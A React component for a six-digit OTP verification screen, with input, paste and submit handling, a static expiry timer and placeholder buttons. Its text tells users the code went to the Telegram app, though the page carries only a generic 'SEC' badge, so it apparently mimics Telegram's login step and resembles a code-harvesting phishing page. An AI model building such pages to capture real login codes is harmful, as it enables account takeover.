import {useRef, useState} from "react";


export default function OTPLoginPage({ phoneNumber, onBack, onVerify }){

  const [otp, setOtp] = useState(['', '', '', '', '', '']);
  const inputRefs = useRef([]);

  const handleOtpChange = (index, value) => {
    if (!/^\d?$/.test(value)) return;

    const newOtp = [...otp];
    newOtp[index] = value;
    setOtp(newOtp);

    if (value && index < 5) {
      inputRefs.current[index + 1].focus();
    }
  };

  const handleKeyDown = (index, e) => {
    if (e.key === 'Backspace' && !otp[index] && index > 0) {
      inputRefs.current[index - 1].focus();
    }
  };

  const handlePaste = (e) => {
    e.preventDefault();
    const pastedData = e.clipboardData.getData('text').slice(0, 6);
    if (/^\d+$/.test(pastedData)) {
      const newOtp = pastedData.split('').slice(0, 6);
      setOtp([...newOtp, ...Array(6 - newOtp.length).fill('')]);
      inputRefs.current[Math.min(newOtp.length, 5)].focus();
    }
  };

  const handleSubmit = (e) => {
    e.preventDefault();
    const code = otp.join('');
    if (code.length === 6) {
      onVerify(code);
    }
  };

  const isOtpComplete = otp.join('').length === 6;

  return (
    <div className="min-h-screen flex items-center justify-center bg-gradient-to-br from-blue-500 to-purple-600 p-6">
      <div className="bg-white rounded-2xl shadow-xl p-8 w-full max-w-md">

        <button
          onClick={onBack}
          className="flex items-center text-gray-500 hover:text-gray-700 mb-4 transition-colors"
        >
          <svg className="w-5 h-5 mr-1" fill="none" stroke="currentColor" viewBox="0 0 24 24">
            <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M15 19l-7-7 7-7" />
          </svg>
          Back
        </button>

        <div className="flex justify-center mb-6">
          <div className="w-20 h-20 bg-gradient-to-br from-green-500 to-green-400 rounded-full flex items-center justify-center shadow-lg">
            <span className="text-white font-bold text-xl">SEC</span>
          </div>
        </div>

        <h2 className="text-gray-800 text-lg font-medium text-center mb-2">
          Enter verification code
        </h2>

        <p className="text-gray-600 text-center text-sm mb-2">
          We sent it to
        </p>

        <p className="text-gray-800 font-medium text-center mb-6">
          +98 {phoneNumber}
        </p>

        <p className="text-gray-500 text-center text-sm mb-8 leading-relaxed">
          We've sent the code to the Telegram app on your other device.
        </p>

        <form onSubmit={handleSubmit} className="space-y-6">
          <div className="flex justify-center space-x-3">
            {otp.map((digit, index) => (
              <input
                key={index}
                ref={(ref) => (inputRefs.current[index] = ref)}
                type="text"
                inputMode="numeric"
                pattern="[0-9]*"
                maxLength="1"
                value={digit}
                onChange={(e) => handleOtpChange(index, e.target.value)}
                onKeyDown={(e) => handleKeyDown(index, e)}
                onPaste={handlePaste}
                className="w-12 h-12 text-center text-xl font-semibold border-2 border-gray-300 rounded-lg focus:border-blue-500 focus:ring-2 focus:ring-blue-200 outline-none transition-all"
              />
            ))}
          </div>

          <button
            type="submit"
            disabled={!isOtpComplete}
            className={`w-full py-3 px-4 rounded-lg font-medium transition-all ${
              isOtpComplete
                ? 'bg-green-500 hover:bg-green-600 text-white shadow-md hover:shadow-lg cursor-pointer'
                : 'bg-gray-300 text-gray-500 cursor-not-allowed'
            }`}
          >
            VERIFY CODE
          </button>
        </form>

        <div className="mt-6 space-y-3 text-center">
          <button className="text-blue-500 hover:text-blue-600 text-sm font-medium transition-colors block w-full">
            Didn't receive the code?
          </button>

          <button className="text-gray-500 hover:text-gray-700 text-sm transition-colors block w-full">
            Change phone number
          </button>
        </div>


        <div className="mt-6 text-center">
          <p className="text-gray-500 text-sm">
            Code expires in: <span className="font-mono text-orange-500">04:59</span>
          </p>
        </div>
      </div>
    </div>
  );
};